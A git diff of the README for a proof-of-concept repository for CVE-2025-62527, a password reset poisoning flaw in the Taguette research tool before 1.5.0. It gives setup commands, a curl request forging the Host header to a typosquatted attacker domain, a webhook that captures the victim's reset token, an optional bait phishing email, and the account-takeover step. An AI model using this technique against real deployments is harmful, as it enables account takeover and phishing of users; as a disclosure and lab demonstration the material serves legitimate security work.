@@ -1,101 +1,166 @@
 # CVE_2025_62527_PoC
 
-<img width="403" height="746" alt="image" src="https://github.com/user-attachments/assets/6632d1ec-3b92-46ea-9b45-1d2b6fb02ce8" />
-
-## Overview
-A **password reset link poisoning vulnerability** (CVE-2025-62527) was identified in **Taguette**, an open-source qualitative research tool.  
-This issue affects **versions prior to 1.5.0** and was **publicly disclosed on October 20, 2025**.
-
-The vulnerability allows an attacker to craft and send **malicious password reset links** to legitimate users.  
-If a victim clicks the tampered link, their account credentials could be compromised or redirected to an attacker-controlled domain.
-
-For more information, see the [GitHub Security Advisory](https://github.com/remram44/taguette/security/advisories/GHSA-7rc8-5c8q-jr6j).
+![Demo screenshot](https://github.com/user-attachments/assets/6632d1ec-3b92-46ea-9b45-1d2b6fb02ce8)
 
 ---
 
+## TL;DR
+
+The password reset functionality in Taguette is vulnerable to a poisoning attack, where an attacker can order a password reset link for a victim while supplying an arbitrary hostname in the Host header, which will then be used as the hostname for the link. When the victim clicks the link (or, more realistically, an email security scanning tool in their network opens the link), the reset token is sent to the attacker. 
+
+More information about this type of attack can be found here: https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning
+
+This repo demonstrates how to reproduce the issue locally and capture a poisoned reset token.
+---
+
+## Overview
+
+* **Vulnerability:** Password reset link poisoning (uses `Host` header when building reset links)
+* **Affected versions:** Taguette < 1.5.0
+* **Disclosed:** October 20, 2025
+* **Reference:** GitHub Security Advisory — `GHSA-7rc8-5c8q-jr6j`.
+  (See upstream advisory for full details and patches.)
+
+---
+
+## What this PoC does
+
+1. Installs Taguette v1.4.1 locally.
+2. Runs a local SMTP viewer (MailHog) to collect outgoing emails.
+3. Posts a password reset request to the Taguette server while forcing a malicious `Host` header (typosquatted domain), causing the reset email to contain a link that points to the attacker domain.
+4. The attacker collects the reset link (with the `reset_token`) and uses it to change the victim’s password.
+
+---
 
 ## Setup
 
-```
+```bash
 git clone https://github.com/Mitchellzhou1/CVE_2025_62527_PoC.git
 cd CVE_2025_62527_PoC
+
+# create virtualenv and install target Taguette version
 python3 -m venv taguette.virtualenv
 . taguette.virtualenv/bin/activate
 pip install taguette==1.4.1
+
+# create an empty SQLite DB file for Taguette to use
 touch taguette.db
+
+# download MailHog (local SMTP viewer)
 wget https://github.com/mailhog/MailHog/releases/latest/download/MailHog_linux_amd64
 chmod +x MailHog_linux_amd64
+```
 
+> **Optional:** For this demo I commented out Taguette’s email rate limiter so repeated resets are allowed. To apply locally:
 
-// This is completely optional step. I my views.py just comments out the email reset rate limit
+```bash
+# copy modified views.py into the virtualenv site-packages
 cp views.py ./taguette.virtualenv/lib/python3.13/site-packages/taguette/web/views.py
+```
 
-// Optional, but this is to make the scenario more believable with typosquating (taguete)
+> **Optional (typosquat hostname):**
+
+```bash
 echo "127.0.0.1 taguete" | sudo tee -a /etc/hosts
 ```
 
-In one terminal run:
-```
+---
+
+## Run the demo
+
+1. Start Taguette:
+
+```bash
 taguette --no-browser server config.py
 ```
-password = `admin`
-url = `http://localhost:7465/`
 
-Register an account, for the demo I used:
+* default URL: `http://localhost:7465/`
 
-Login: `john`
-Password: `12345`
-Email: `john@gmail.com`
-<img width="488" height="434" alt="image" src="https://github.com/user-attachments/assets/b9f8bd5a-0e32-4c85-8130-7137b14e7afa" />
+2. Register a test user (example used in the PoC):
 
-How enter the Attacker! He wants to gain control of John's account.
+* Login: `john`
+* Password: `12345`
+* Email: `john@gmail.com`
 
-in a seperate terminal run:
-```
+3. Start MailHog (capture outgoing email):
+
+```bash
 ./MailHog_linux_amd64
+# MailHog UI: http://0.0.0.0:8025/
 ```
 
-Open another terminal and run:
-```
+4. Run the PoC webhook to capture clicks:
+
+```bash
 python3 webhook.py
 ```
 
+5. (Optional) Send a bait email so the victim expects something:
 
-For the sake of the demonstration, this MailHog will be the view of John our victim.
-then navigate to MailHog at `http://0.0.0.0:8025/`
-
-Optional: run `python3 first_email.py` to send a Password Expired bait email to John, or it might make John suspecious that he got a password reset link when he never asked for it.
-
-Now time to send the malicious password reset email:
-
+```bash
+python3 first_email.py
 ```
+
+<img width="846" height="370" alt="image" src="https://github.com/user-attachments/assets/5fd1b05a-68bc-48d0-81f7-ed2efc4fb99e" />
+
+
+---
+
+## Trigger the poisoned reset email
+
+Forge the `Host` header so Taguette composes a reset link using the attacker domain.
+
+**Example `curl` request (forges Host header to `taguete.com` — a typosquatted attacker domain):**
+
+you can get the xsrf token by `inspect element`
+<img width="671" height="45" alt="image" src="https://github.com/user-attachments/assets/29ec556d-36c2-4153-9c90-ac1d5b752d51" />
+
+```bash
 curl -i -X POST 'http://127.0.0.1:7465/reset_password' \
   -H 'Host: taguete.com' \
   -H 'Content-Type: application/x-www-form-urlencoded' \
-  -H 'Cookie: _xsrf=2|c3bd35bd|735af119b351286a96df7924fa7ca0ed|1761923555' \
-  --data-urlencode "_xsrf=2|c3bd35bd|735af119b351286a96df7924fa7ca0ed|1761923555" \
+  -H 'Cookie: _xsrf=<valid_xsrf_cookie_value>' \
+  --data-urlencode "_xsrf=<valid_xsrf_cookie_value>" \
   --data-urlencode "email=john@gmail.com"
 ```
 
-Go back to HogMail, and John should see a email reset link set by the Legit Taguette server but we have injected our domain into the based of the link (taguete.com).
+**Notes:**
 
-<img width="713" height="387" alt="image" src="https://github.com/user-attachments/assets/2862ea70-d69f-42bf-951d-1ee7df6643f8" />
+* Tornado’s XSRF protection requires the `_xsrf` cookie value to match the `_xsrf` POST field. Get a valid `_xsrf` by visiting the site (or capture it from a browser session).
 
-The legitmate domain was localhost:7465 
-<img width="713" height="387" alt="image" src="https://github.com/user-attachments/assets/8eff466d-486e-4aeb-a01a-ded50341f49f" />
+After sending the request, check MailHog. The reset email will contain a link whose host is `taguete.com` (the attacker domain). When the victim clicks that link, the attacker (listening on `taguete.com`) can capture the `reset_token` parameter; the PoC webhook collects it.
 
+---
 
-Now "John" clicks on the malicious link and our webhook captures the request:
-<img width="748" height="156" alt="image" src="https://github.com/user-attachments/assets/0c926d28-b0bd-4f16-9ad4-ba7c1607f00e" />
+## Using the captured token
 
-We now have the reset_token, which is linked to John's account, and we can now reset his password and takeover his account.
+Once you have the token (captured by the webhook), open the legitimate Taguette reset endpoint and pass the token:
 
-Go to: 
-`http://localhost:7465/new_password?reset_token=<captured_token>`
+```
+http://localhost:7465/new_password?reset_token=<captured_token>
+```
 
-<img width="778" height="436" alt="image" src="https://github.com/user-attachments/assets/22cb339c-5261-4ff9-9280-4d48d50adcd4" />
+This opens the Set New Password form and allows the attacker to set a new password for the victim account.
 
+---
 
+## Example screenshots
 
+* Outgoing email as generated by Taguette showing the attacker host (MailHog):
+  ![MailHog poisoned email](https://github.com/user-attachments/assets/2862ea70-d69f-42bf-951d-1ee7df6643f8)
 
+* Legitimate email should have contained `localhost:7465`:
+  ![Legit reset link example](https://github.com/user-attachments/assets/8eff466d-486e-4aeb-a01a-ded50341f49f)
 
+* Webhook capture of the victim clicking the poisoned link:
+  ![Webhook capture](https://github.com/user-attachments/assets/0c926d28-b0bd-4f16-9ad4-ba7c1607f00e)
+
+---
+
+## Root cause
+
+Taguette used the request `Host` header (`request.host`) when building absolute URLs in outgoing password-reset emails. If an attacker can control the `Host` header or exploit a typo in the recipient’s DNS (typosquatting), the reset email can point to an attacker-controlled domain.
+
+## Sources:
+https://github.com/remram44/taguette/security/advisories/GHSA-7rc8-5c8q-jr6j
+https://gitlab.com/remram44/taguette/-/issues/331
